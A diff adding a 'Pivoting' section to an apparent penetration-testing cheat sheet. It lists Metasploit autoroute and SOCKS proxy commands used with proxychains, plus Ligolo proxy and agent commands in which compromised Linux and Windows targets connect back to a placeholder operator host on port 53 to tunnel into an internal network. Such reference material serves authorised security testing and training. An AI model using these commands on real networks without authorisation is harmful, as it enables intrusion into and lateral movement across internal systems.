@@ -1822,6 +1822,43 @@ msf6> set session 1
 msf6> run
 ```
 
+## Pivoting
+
+### Metasploit
+```
+msfconsole
+> search autoroute
+> use 0
+> set session $
+> run
+
+> search socks
+> use 0
+> set srvport 9050
+> run
+
+$ proxychains -q cme smb .........
+```
+
+### Ligolo
+Linux Host 
+```bash
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+ip route add 192.168.110.0/24 dev ligolo
+./proxy -laddr 0.0.0.0:53 -selfcert
+```
+
+Linux Target
+```bash
+# upload compiled agent
+./agent -connect x.x.x.x:53 -ignore-cert &
+```
+
+Windows Target
+```cmd
+.\agent.exe -connect x.x.x.x:53 -ignore-cert
+```
 
 ## Active Directory Persistence
 
